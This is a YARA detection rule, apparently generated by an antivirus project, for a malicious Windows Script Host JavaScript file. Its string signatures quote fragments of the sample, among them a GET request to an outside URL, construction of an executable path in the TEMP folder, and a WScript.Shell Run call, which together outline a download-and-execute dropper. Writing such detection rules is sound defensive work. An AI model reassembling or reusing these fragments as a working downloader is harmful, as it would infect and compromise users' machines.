rule sig_20160329_75e022beb173dcc3e1d36e574bbcb03c {
  meta:
    description = "datamaliciousorder - file 20160329_75e022beb173dcc3e1d36e574bbcb03c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "344cc9c3b33125769ec3278bf5ec03a1d3300c999770398f1b9a880524ae3da6"

  strings:
    $s1  = "dk[o](\"GET\", \"http://shippedmedicalsupplies.com/n5ids\", false);" fullword ascii
    $s2  = "function jS() {return x0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"p8OQX4Ddufq6.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[iF](rc() * 11); if (dk[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function NQ(iU, u0){D = D * 1; return iU - u0;};" fullword ascii
    $s5  = "var x0 = function SJ() {return WScript[U0](\"WScript.Shell\");}(), a1 = 11;" fullword ascii
    $s6  = "function U(){return \"\" + SJ0;};" fullword ascii
    $s7  = "function c() {return ((V == true) && (V == Is)) ? 1 : D;};" fullword ascii
    $s8  = "function Z(a){x0[\"Run\"](a, D, D);};" fullword ascii
    $s9  = "var M0 = new this[\"Date\"]();" fullword ascii
    $s10 = "function u(rb) {var Jb = (1, 2, 3, 4, 5, rb); return Jb;};" fullword ascii
    $s11 = "return NQ(Xo, N);" fullword ascii
    $s12 = " while (nJ){" fullword ascii
    $s13 = "function rc(){return 22;};" fullword ascii
    $s14 = "function j()" fullword ascii
    $s15 = "function LD(){return U0;};" fullword ascii
    $s16 = "V = true; " fullword ascii
    $s17 = "var V = false;" fullword ascii
    $s18 = "Is = true; " fullword ascii
    $s19 = "var S = false;" fullword ascii
    $s20 = "var Is = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}